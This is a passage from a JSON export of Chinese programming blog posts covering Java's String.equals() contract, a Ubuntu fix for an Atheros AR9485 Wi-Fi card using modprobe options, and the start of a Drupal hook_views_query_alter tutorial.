style=\"color:rgb(0,0,255); line-height:1.5!important\">public</span> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">boolean</span><span style=\"line-height:1.5!important\"> equals(Object anObject) {\n    </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">if</span> (<span style=\"color:rgb(0,0,255); line-height:1.5!important\">this</span> ==<span style=\"line-height:1.5!important\"> anObject) {\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">return</span> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">true</span><span style=\"line-height:1.5!important\">;\n    }\n    </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">if</span> (anObject <span style=\"color:rgb(0,0,255); line-height:1.5!important\">instanceof</span><span style=\"line-height:1.5!important\"> String) {\n        String anotherString </span>=<span style=\"line-height:1.5!important\"> (String)anObject;\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">int</span> n =<span style=\"line-height:1.5!important\"> count;\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">if</span> (n ==<span style=\"line-height:1.5!important\"> anotherString.count) {\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">char</span> v1[] =<span style=\"line-height:1.5!important\"> value;\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">char</span> v2[] =<span style=\"line-height:1.5!important\"> anotherString.value;\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">int</span> i =<span style=\"line-height:1.5!important\"> offset;\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">int</span> j =<span style=\"line-height:1.5!important\"> anotherString.offset;\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">while</span> (n-- != 0<span style=\"line-height:1.5!important\">) {\n            </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">if</span> (v1[i&#43;&#43;] != v2[j&#43;&#43;<span style=\"line-height:1.5!important\">])\n            </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">return</span> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">false</span><span style=\"line-height:1.5!important\">;\n        }\n        </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">return</span> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">true</span><span style=\"line-height:1.5!important\">;\n        }\n    }\n    </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">return</span> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">false</span><span style=\"line-height:1.5!important\">;\n    }</span></pre>\r\n<div class=\"cnblogs_code_toolbar\" style=\"margin-top:5px\"><span class=\"cnblogs_code_copy\" style=\"padding-right:5px; line-height:1.5!important\"><a target=\"_blank\" target=\"_blank\" title=\"复制代码\" style=\"color:rgb(26,139,200); border:none!important\"><img src=\"http://common.cnblogs.com/images/copycode.gif\" alt=\"复制代码\" style=\"border:none!important\"></a></span></div>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">这里对equals重新需要注意五点：</p>\r\n<p align=\"left\" style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">1&nbsp;&nbsp; 自反性：对任意引用&#20540;X，x.equals(x)的返回&#20540;一定为true.&nbsp;<br>\r\n2&nbsp;&nbsp;&nbsp;对称性：对于任何引用&#20540;x,y,当且仅当y.equals(x)返回&#20540;为true时，x.equals(y)的返回&#20540;一定为true;&nbsp;<br>\r\n3&nbsp;&nbsp;&nbsp;传递性：如果x.equals(y)=true, y.equals(z)=true,则x.equals(z)=true&nbsp;<br>\r\n4&nbsp;&nbsp; 一致性：如果参与比较的对象没任何改变，则对象比较的结果也不应该有任何改变&nbsp;<br>\r\n5&nbsp;&nbsp; 非空性：任何非空的引用&#20540;X，x.equals(null)的返回&#20540;一定为false&nbsp;</p>\r\n<p align=\"left\" style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">经过重写后就跟==有本质的区别了：</p>\r\n<p align=\"left\" style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">equal:是用来比较两个对象内部的内容是否相等的，由于所有的类都是继承自java.lang.Object类的，所以如果没有对该方法进行覆盖的话，调用<br>\r\n的仍然是Object类中的方法，而Object中的equal方法返回的却是==的判断，因此，如果在没有进行该方法的覆盖后，调用该方法是没有<br>\r\n任何意义的。在java面向对象的处理中我们一般在javabean中都要选择重写equals方法，使用hibernate后，我们要生成数据库的映射文件与实体</p>\r\n<p align=\"left\" style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">类，这是我们就最好在实体类中进行equals方法的重写，重写时我们可以根据自己的定义来实现该方法只要遵守那五条原则，例如对于一个student类</p>\r\n<p align=\"left\" style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">我们定义只要在学号相同时我们就认为这两个对象时相等的；同时我们还要重写hashcode方法<a target=\"_blank\" target=\"_blank\" href=\"http://www.cnblogs.com/shenliang123/archive/2012/04/16/2452206.html\" style=\"color:rgb(26,139,200); text-decoration:none\">http://www.cnblogs.com/shenliang123/archive/2012/04/16/2452206.html</a><br>\r\n==：是用来判断两个对象的地址是否相同，即是否是指相同一个对象。比较的是真正意义上的指针操作。</p>\r\n<p align=\"left\" style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">待续</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n</div>\r\n<div id=\"MySignature\" style=\"color:rgb(75,75,75); font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:13px; line-height:19.5px\">\r\n希望多多交流，多多关注，共同成就梦想</div>\r\n",
			"tags":"java,string,代码",
			"id":"49280163",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年09月28日 15:31:22",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"华硕X550VC（Qualcomm Atheros AR9485 无线网卡）解决在ubuntu14.04/15.04下无线网卡不能链接无线网问题根据这五个命令来解决无线网卡驱动问题，最后一部echo数据后自行重启系统即可完美解决驱动问题。有问题请留言。lspci -nnk | grep -iA2 net\nlsmod\niwconfig\nrfkill list\nlspci -nnk | grep -iA",
			"title":"华硕X550VC（Qualcomm Atheros AR9485 无线网卡）解决在ubuntu14.04/15.04下无线网卡不能链接无线网问题",
			"type":"translated",
			"content":"<h1 id=\"华硕x550vcqualcomm-atheros-ar9485-无线网卡解决在ubuntu14041504下无线网卡不能链接无线网问题\">华硕X550VC（Qualcomm Atheros AR9485 无线网卡）解决在ubuntu14.04/15.04下无线网卡不能链接无线网问题</h1>\n\n<p>根据这五个命令来解决无线网卡驱动问题，最后一部echo数据后自行重启系统即可完美解决驱动问题。有问题请留言。 <br>\nlspci -nnk | grep -A2 0280 <br>\nlsmod | grep -e ath9k -e asus <br>\nrfkill list all rfkill list all </p>\n\n<p>1：检查驱动是否安装成功：</p>\n\n<p>lspci -nnk | grep -A2 0280 <br>\n例如输出显示“Kernel driver in use:ath9k”,记住后面的ath9k，接下来要用到。 <br>\n2：检查asus_nb_wmi驱动是否正常使用</p>\n\n<p>lsmod | grep -e ath9k -e asus <br>\n其中ath9k是上面步骤1中的输出。在这一步如果正常情况下是能够看到wifi网卡的驱动以及一个“asus_nb_wmi”的字样输出。 <br>\n3：检查一下wifi的“Hard blocked”状态。</p>\n\n<p>rfkill list all  <br>\n如果phy0上面显示“Hard blocked:yes” <br>\n4：将系统挂起，然后重新唤醒系统，wifi是否能够正常使用？</p>\n\n<p>如果上述四个步骤确认下来，那么你的系统就存在了这个bug了，可以通过下面的操作来解决这个问题。</p>\n\n<p>解决方法：</p>\n\n<p>在系统终端中输入如下命令：</p>\n\n<p>echo “options asus_nb_wmi wapf=4” | sudo tee /etc/modprobe.d/asus_nb_wmi.conf</p>\n\n<p>这样子系统会在开启的时候自动加载华硕wifi驱动的内核模块，重启系统就可以解决这个问题，以后就不需要每次开机都要挂起才能使用wifi了。</p>\n\n<p>有什么问题欢迎留言讨论</p>",
			"markdowncontent":"# 华硕X550VC（Qualcomm Atheros AR9485 无线网卡）解决在ubuntu14.04/15.04下无线网卡不能链接无线网问题\n\n\n根据这五个命令来解决无线网卡驱动问题，最后一部echo数据后自行重启系统即可完美解决驱动问题。有问题请留言。\nlspci -nnk | grep -A2 0280\nlsmod | grep -e ath9k -e asus\nrfkill list all rfkill list all \n\n1：检查驱动是否安装成功：\n\nlspci -nnk | grep -A2 0280\n例如输出显示“Kernel driver in use:ath9k”,记住后面的ath9k，接下来要用到。\n2：检查asus_nb_wmi驱动是否正常使用\n\nlsmod | grep -e ath9k -e asus\n其中ath9k是上面步骤1中的输出。在这一步如果正常情况下是能够看到wifi网卡的驱动以及一个“asus_nb_wmi”的字样输出。\n3：检查一下wifi的“Hard blocked”状态。\n\nrfkill list all \n如果phy0上面显示“Hard blocked:yes”\n4：将系统挂起，然后重新唤醒系统，wifi是否能够正常使用？\n\n\n如果上述四个步骤确认下来，那么你的系统就存在了这个bug了，可以通过下面的操作来解决这个问题。\n\n\n解决方法：\n\n在系统终端中输入如下命令：\n\necho \"options asus_nb_wmi wapf=4\" | sudo tee /etc/modprobe.d/asus_nb_wmi.conf\n\n这样子系统会在开启的时候自动加载华硕wifi驱动的内核模块，重启系统就可以解决这个问题，以后就不需要每次开机都要挂起才能使用wifi了。\n\n\n有什么问题欢迎留言讨论",
			"tags":"X550VC,ubuntukylin,无线网卡,驱动",
			"id":"48785447",
			"categories":"ubuntu",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年09月28日 15:15:26",
			"articleedittype":1,
			"private":0,
			"channel":"0",
			"description":"根据这五个命令来解决无线网卡驱动问题，最后一部echo数据重启系统即可完美解决驱动问题。有问题请留言。\r\n1->     lspci -nnk | grep -iA2 net\nlsmod\niwconfig\nrfkill list\n\r\n\r\nlspci\r\n -nnk | grep -iA2 net\r\n01:00.0 Ethernet controller [0200]: Realtek Semicon",
			"title":"华硕X550VC（Qualcomm Atheros AR9485 无线网卡）解决在ubuntu14.04/15.04下无线网卡不能链接无线网问题",
			"type":"0",
			"content":"\r\n<pre style=\"margin-top:0px; margin-bottom:1em; padding:5px; border:0px; font-size:13px; overflow:auto; width:auto; max-height:600px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; word-wrap:normal; color:rgb(17,17,17); background-color:rgb(238,238,238)\"><code style=\"margin:0px; padding:0px; border:0px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:inherit\">根据这五个命令来解决无线网卡驱动问题，最后一部echo数据重启系统即可完美解决驱动问题。有问题请留言。</code></pre>\r\n<pre style=\"margin-top:0px; margin-bottom:1em; padding:5px; border:0px; font-size:13px; overflow:auto; width:auto; max-height:600px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; word-wrap:normal; color:rgb(17,17,17); background-color:rgb(238,238,238)\"><code style=\"margin:0px; padding:0px; border:0px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:inherit\">1-&gt;     lspci -nnk | grep -iA2 net\nlsmod\niwconfig\nrfkill list\n</code></pre>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\n<code style=\"margin:0px; padding:1px 5px; border:0px; font-size:13px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:pre-wrap; background-color:rgb(238,238,238)\">lspci\r\n -nnk | grep -iA2 net</code></p>\r\n<pre style=\"margin-top:0px; margin-bottom:1em; padding:5px; border:0px; font-size:13px; overflow:auto; width:auto; max-height:600px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; word-wrap:normal; color:rgb(17,17,17); background-color:rgb(238,238,238)\"><code style=\"margin:0px; padding:0px; border:0px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:inherit\">01:00.0 Ethernet controller [0200]: Realtek Semiconductor Co., Ltd. RTL8101E/RTL8102E PCI\nExpress Fast Ethernet controller [10ec:8136] (rev 05)\n    Subsystem: Acer Incorporated [ALI] Device [1025:061f]\n    Kernel driver in use: r8169\n02:00.0 Network controller [0280]: Qualcomm Atheros AR9485 Wireless Network Adapter [168c:0032] (rev 01)\n    Subsystem: Foxconn International, Inc. Device [105b:e047]\n03:00.0 Unassigned class [ff00]: Realtek Semiconductor Co., Ltd. RTS5209 PCI Express Card Reader [10ec:5209] (rev 01)\n</code></pre>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\n<code style=\"margin:0px; padding:1px 5px; border:0px; font-size:13px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:pre-wrap; background-color:rgb(238,238,238)\">lsmod</code></p>\r\n<pre style=\"margin-top:0px; margin-bottom:1em; padding:5px; border:0px; font-size:13px; overflow:auto; width:auto; max-height:600px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; word-wrap:normal; color:rgb(17,17,17); background-color:rgb(238,238,238)\"><code style=\"margin:0px; padding:0px; border:0px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:inherit\">Module                  Size  Used by\nnls_iso8859_1          12713  1 \nparport_pc             32701  0 \nppdev                  17671  0 \nbnep                   19564  2 \nrfcomm                 69070  0 \nbluetooth             371874  10 bnep,rfcomm\nvesafb                 13828  1 \nlp                     17759  0\nparport                42299  3 lp,ppdev,parport_pc\nhid_generic            12548  0 \nusbhid                 53014  0 \nhid                   101512  2 hid_generic,usbhid\nusb_storage            62062  1 \nrtsx_pci_sdmmc         23527  0 \nahci                   25819  2 \nlibahci                31898  1 ahci\nrtsx_pci               45546  1 rtsx_pci_sdmmc\nr8169                  67341  0\nmii                    13934  1 r8169\n</code></pre>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\n<code style=\"margin:0px; padding:1px 5px; border:0px; font-size:13px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:pre-wrap; background-color:rgb(238,238,238)\">iwconfig</code></p>\r\n<pre style=\"margin-top:0px; margin-bottom:1em; padding:5px; border:0px; font-size:13px; overflow:auto; width:auto; max-height:600px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; word-wrap:normal; color:rgb(17,17,17); background-color:rgb(238,238,238)\"><code style=\"margin:0px; padding:0px; border:0px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:inherit\">eth0      no wireless extensions.\nlo        no wireless extensions.\n</code></pre>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\n<code style=\"margin:0px; padding:1px 5px; border:0px; font-size:13px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:pre-wrap; background-color:rgb(238,238,238)\">rfkill\r\n list</code></p>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\n这最后一个命令不会输出任何东西，至于其中原理，我也是完全不知道。根据每一步操作即可。</p>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\nThe last command did not give an output so I could not follow the instructions that were to come as shown below;</p>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\nDeactivate the hardware encryption of the driver:</p>\r\n<p style=\"margin-top:0px; margin-bottom:1em; padding-top:0px; padding-bottom:0px; border:0px; font-size:15px; clear:both; color:rgb(17,17,17); font-family:Ubuntu,Arial,'libra sans',sans-serif; line-height:19.5px\">\r\nCode:</p>\r\n<pre style=\"margin-top:0px; margin-bottom:1em; padding:5px; border:0px; font-size:13px; overflow:auto; width:auto; max-height:600px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; word-wrap:normal; color:rgb(17,17,17); background-color:rgb(238,238,238)\"><code style=\"margin:0px; padding:0px; border:0px; font-family:Consolas,Menlo,Monaco,'Lucida Console','Liberation Mono','DejaVu Sans Mono','Bitstream Vera Sans Mono','Courier New',monospace,sans-serif; white-space:inherit\">echo &quot;options ath9k nohwcrypt=1&quot; | sudo tee /etc/modprobe.d/ath9k.conf\nsudo modprobe -rfv ath9k\nsudo modprobe -v ath9k</code></pre>\r\n",
			"tags":"",
			"id":"48784953",
			"categories":"",
			"status":2
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年06月10日 10:57:36",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"作者：yoqu \r\n欢迎转载，但请转载的朋友把我的名字留着，毕竟大家都是幸幸苦苦总结的。\r\n函数api地址：https://api.drupal.org/api/views/views.api.php/function/hook_views_query_alter/7\r\n    该函数作用为：在view执行query之前对query进行复写\r\n\r\n近期工作项目需要，会用到根据用户角色来过滤一些内容",
			"title":"用好hook_views_query_alter，高度自定义view的筛选功能",
			"type":"original",
			"content":"\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n作者：yoqu&nbsp;<br style=\"margin:0px; padding:0px\">\r\n欢迎转载，但请转载的朋友把我的名字留着，毕竟大家都是幸幸苦苦总结的。<br style=\"margin:0px; padding:0px\">\r\n函数api地址：https://api.drupal.org/api/views/views.api.php/function/hook_views_query_alter/7<br style=\"margin:0px; padding:0px\">\r\n&nbsp; &nbsp; 该<span style=\"margin:0px; padding:0px; color:rgb(255,0,0)\">函数作用</span>为：在view执行query之前对query进行复写</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n近期工作项目需要，会用到根据用户角色来过滤一些内容。而view的设置里面不是很方便，虽然可以用FILTER CRITERIA里面直接添加php来过滤，但是效果不理想，不能达到高度自定义，由此使用到了hook_views_query_alter来自定义条件过滤内容<br style=\"margin:0px; padding:0px\">\r\n过滤在我了解的有两种<br style=\"margin:0px; padding:0px\">\r\n1.在query里面可以加入一个table进行where查询<br style=\"margin:0px; padding:0px\">\r\n2.新的数据表和旧的数据表关联进行where条件查询</p>\r\n<p style=\"margin-top:10px; margin-bottom:12px; padding-top:0px; padding-bottom:0px; line-height:1.85em; text-indent:2em; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px\">\r\n1.使用增加一个table用where过滤</p>\r\n<div style=\"margin:0px; padding:0px; color:rgb(76,81,84); font-family:Verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2000007629395px\">\r\n<div id=\"highlighter_352483\" class=\"syntaxhighlighter  php\" style=\"margin:1em 0px!important; padding:10px 0px; width:682.625px; position:relative!important; overflow:auto!important; font-size:1em!important; background-color:rgb(15,25,42)!important\">\r\n<div class=\"toolbar\" style=\"margin:0px!important; padding:0px!important; border:none!important; bottom:auto!important; float:none!important; height:11px!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:absolute!important; right:1px!important; top:1px!important; vertical-align:baseline!important; width:11px!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:10px!important; min-height:inherit!important; z-index:10!important; color:rgb(209,237,255)!important; background:rgb(67,90,95)!important\">\r\n<span style=\"margin:0px; padding:0px\"><a target=\"_blank\" href=\"http://drupalchina.cn/node/5469#\" class=\"toolbar_item command_help help\" style=\"color:rgb(9,157,93); margin:0px!important; padding:1px 0px 0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:center!important; top:auto!important; vertical-align:baseline!important; width:auto!important; font-size:14px!important; min-height:inherit!important; text-decoration:none!important; display:block!important; background:none!important\">?</a></span></div>\r\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse:collapse; width:682px; margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:14px!important; min-height:inherit!important; background:none!important\">\r\n<tbody style=\"margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; background:none!important\">\r\n<tr style=\"margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; background:none!important\">\r\n<td class=\"gutter\" style=\"padding:5px 8px; border:1px solid rgb(211,231,244); margin:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:14px!important; min-height:inherit!important; color:rgb(175,175,175)!important; background:none!important\">\r\n<div class=\"line number1 index0 alt2\" style=\"margin:0px!important; padding:0px 0.5em 0px 1em!important; border-width:0px 3px 0px 0px!important; border-right-style:solid!important; border-right-color:rgb(67,90,95)!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:right!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n1</div>\r\n<div class=\"line number2 index1 alt1\" style=\"margin:0px!important; padding:0px 0.5em 0px 1em!important; border-width:0px 3px 0px 0px!important; border-right-style:solid!important; border-right-color:rgb(67,90,95)!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; text-align:right!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n2</div>\r\n</td>\r\n<td class=\"code\" style=\"padding:5px 8px; border:1px solid rgb(211,231,244); width:650px; margin:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; font-family:Consolas,'Bitstream Vera Sans Mono','Courier New',Courier,monospace!important; font-size:14px!important; min-height:inherit!important; background:none!important\">\r\n<div class=\"container\" style=\"margin:0px!important; padding:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:relative!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; background:none!important\">\r\n<div class=\"line number1 index0 alt2\" style=\"margin:0px!important; padding:0px 1em!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n<code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$query</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">-&gt;add_table(</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(29,193,22)!important; background:none!important\">'[表名]'</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">);</code></div>\r\n<div class=\"line number2 index1 alt1\" style=\"margin:0px!important; padding:0px 1em!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; white-space:pre!important\">\r\n<code class=\"php variable\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(255,170,62)!important; background:none!important\">$query</code><code class=\"php plain\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; overflow:visible!important; position:static!important; right:auto!important; top:auto!important; vertical-align:baseline!important; width:auto!important; min-height:inherit!important; color:rgb(209,237,255)!important; background:none!important\">-&gt;add_where(0,\r\n</code><code class=\"php string\" style=\"padding:0px 3px; font-family:'Courier New',monospace; margin:0px!important; border:0px!important; bottom:auto!important; float:none!important; height:auto!important; left:auto!important; line-height:1.1em!important; outline:0px!important; 